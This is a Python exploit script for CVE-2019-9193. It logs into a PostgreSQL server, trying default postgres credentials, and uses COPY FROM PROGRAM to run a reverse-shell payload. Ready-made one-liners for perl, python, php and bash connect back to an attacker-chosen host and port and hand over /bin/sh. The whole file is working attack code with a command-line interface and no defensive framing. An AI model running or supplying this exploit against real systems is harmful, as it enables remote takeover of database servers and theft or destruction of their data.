import psycopg2
from psycopg2.extras import RealDictCursor
import argparse
import socket


def do_reverse_connection(RHOST, RPORT, LHOST, LPORT, USER='postgres', PW='postgres', METHOD='perl'):

    DB = "postgres"
    conn = psycopg2.connect(database=DB, host=RHOST, user=USER,
                            password=PW, port=RPORT, connect_timeout=10)
    pcur = conn.cursor(cursor_factory=RealDictCursor)
    if METHOD == 'perl':
        cmd_exec = f"""perl -e ''use Socket;$i="{LHOST}";$p={int(LPORT)};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};''"""
    elif METHOD in ['python', 'python3']:
        cmd_exec = f"""{METHOD} -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''"""
    elif METHOD == 'php':
        cmd_exec = f"""php -r ''$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");''"""
    elif METHOD == 'bash':
        cmd_exec = f"""bash -c ''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''"""
    print(cmd_exec)
    cmd_list = [
        'DROP TABLE IF EXISTS cmd_execc;',
        'CREATE TABLE cmd_execc(filename text);',
        "COPY cmd_execc FROM PROGRAM '{}'".format(cmd_exec)
    ]

    [pcur.execute(cmd) for cmd in cmd_list]


if __name__ in "__main__":
    parser = argparse.ArgumentParser(
        description="used for cve-2019-9193 linux get shell")
    parser.add_argument('--url', '-u', required=True,
                        help='host:port specify RHOST AND RPORT')
    parser.add_argument('--lhost', required=True,
                        help='YOUR IP ADDRESS FOR REVERSE SHELL')
    parser.add_argument('--lport', required=True,
                        help='YOUR LISTENING PORT FOR REVERSE SHELL')
    parser.add_argument('--user', action='store',default='postgres', help='database username')
    parser.add_argument('--password', action='store', default='postgres',
                        help='database password')
    parser.add_argument('--method', '-m', type=str, choices=[
                        'perl', 'python', 'python3', 'php', 'bash'], default='bash', help='PAYOAD METHOD FOR REVERSE SHELL')
    args = parser.parse_args()

    url = args.url.split(':')
    if len(url) == 1:
        rhost, rport = url[0], 5432
    elif len(url) == 2:
        rhost, rport = tuple(url)
    else:
        print('url format wrong')
        exit(1)
    try:
        do_reverse_connection(rhost, rport, args.lhost, args.lport,
                              USER=args.user, PW=args.password, METHOD=args.method)
    except Exception as e:
        print(e)
    print('command has send,check your reverse shell')
